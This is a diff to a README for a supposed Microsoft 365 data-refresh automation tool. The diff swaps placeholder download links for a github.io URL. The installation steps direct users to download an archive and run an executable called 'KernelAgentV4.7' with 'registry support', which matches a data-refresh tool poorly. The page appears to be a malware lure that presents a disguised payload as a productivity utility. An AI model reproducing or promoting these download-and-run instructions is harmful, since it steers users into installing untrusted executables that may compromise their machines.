@@ -2,13 +2,15 @@
 
 Automate scheduled data refresh across Microsoft 365 tools including Excel, Power BI, and Access. This tool ensures local and cloud sources sync on time, without user intervention or broken connections.
 
-[![Download Data Refresh Tool](https://img.shields.io/badge/Download-Data_Refresh_Tool-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Data Refresh Tool](https://img.shields.io/badge/Download-Data_Refresh_Tool-blueviolet)](🔗 https://scheduled-data-refresh-m365-automation.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](🔗 https://scheduled-data-refresh-m365-automation.github.io/.github
+) section  
 2. 📁 **Extract the folder** to a desired path (e.g. `C:\M365DataRefresh`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7` to activate refresh triggers and registry support  
 4. ⏰ Schedule refresh tasks via built-in UI or Windows Task Scheduler  
